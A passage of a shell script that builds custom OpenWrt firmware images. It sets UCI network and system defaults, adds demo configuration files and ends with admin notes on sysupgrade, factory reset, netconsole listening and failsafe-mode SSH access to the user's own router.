uci add_list system.ntp.server='1.debian.pool.ntp.org'
uci set system.ntp.enabled='1'
uci set system.@system[-1].hostname='mir4a'
uci set dhcp.@dnsmasq[0].cachesize='5000'
uci set dhcp.lan.ra_slaac='1'
uci del dhcp.lan.ra_flags
uci add_list dhcp.lan.ra_flags='managed-config'
uci add_list dhcp.lan.ra_flags='other-config'
EOF
        ;;
    *)  echo "Unexpected option $id"; exit 1;;
esac
PKG="${PACKAGES[@]} ${PACKAGES_REMOVE[@]}"
SVC="${DISABLED_SVC[@]}"
# mydir/etc/ssh/sshd_config
# #change 192.168.1.1 => 192.168.31.1  via /etc/uci-defaults/00-network
mkdir -pv -m0755 \
    "${DIRNAME}/mydir/root" \
    "${DIRNAME}/mydir/etc/profile.d" \
    "${DIRNAME}/mydir/etc/sysctl.d"

add_shell_ps1 > "${DIRNAME}/mydir/etc/profile.d/johnyin.sh"
add_sysctl  > "${DIRNAME}/mydir/etc/sysctl.d/11-johnyin.conf"
add_demo > "${DIRNAME}/mydir/root/demo"
add_demo_dnat > "${DIRNAME}/mydir/root/dnat.sh"
add_demo_home_ap_default > "${DIRNAME}/mydir/root/default.sh"
add_demo_wifi_sta_ap_slaac > "${DIRNAME}/mydir/root/wifi_sta_ap_slaac"
add_demo_vlan > "${DIRNAME}/mydir/root/vlan"
add_demo_lan_dhcp_static > "${DIRNAME}/mydir/root/lan_static_dhcp"
add_demo_vlan_8021q > "${DIRNAME}/mydir/root/vlan_8021q.sh"
rm ./out/* -f

echo "DISABLED_SERVICES=${SVC}"
echo "BIN_DIR=${DIRNAME}/out/"
echo "PACKAGES=${PKG}"
find "${DIRNAME}/mydir" -type f 2>/dev/null  | sed "s|${DIRNAME}/||g" | xargs -I@ echo "Add File: [@]"

make image PROFILE="${id}" \
PACKAGES="${PKG}" \
BIN_DIR="${DIRNAME}/out/" \
FILES="${DIRNAME}/mydir" \
FILES_REMOVE="${DIRNAME}/files_remove" \
DISABLED_SERVICES="${SVC}"

cat <<'EOF'
for radio in 'radio0' 'radio1'
do
    # Radio doesn't exist.
    uci -q get wireless."$radio" || continue
    ssid="$(uci -q get wireless.default_${radio}.ssid)"
    uci set wireless.default_${radio}.ssid="`uci -q get system.@system[0].hostname`"
done
# for dropbear without sftp srv
scp -O root@192.168.1.1:/etc/config/* .
# wr703n
    # ip a a 192.168.1.2/24 dev eth0
    nc -ul 6666 #push reset, then poweron keep push 10sec
    # U-Boot 1.1.4  (Apr 22 2013)
firstboot && reboot now # reset factory
scp firmware.bin root@192.168.168.254:/tmp/
sysupgrade -v /tmp/firmware.bin

OpenWrt Failsafe Mode:
    1. Power off the router.
    2. Power it on while watching the status LED.
    3. As soon as the light starts blinking, press and hold any button (or the reset button) repeatedly for a short 2–4 second window to trigger Failsafe Mode.
    4. Set your computer's Ethernet adapter to a static IP (e.g., 192.168.1.2, subnet 255.255.255.0) and connect via LAN cable.
    5. Telnet or SSH into 192.168.1.1.
    ssh -o HostKeyAlgorithms=+ssh-rsa -o PubkeyAcceptedAlgorithms=+ssh-rsa root@192.168.1.1
EOF
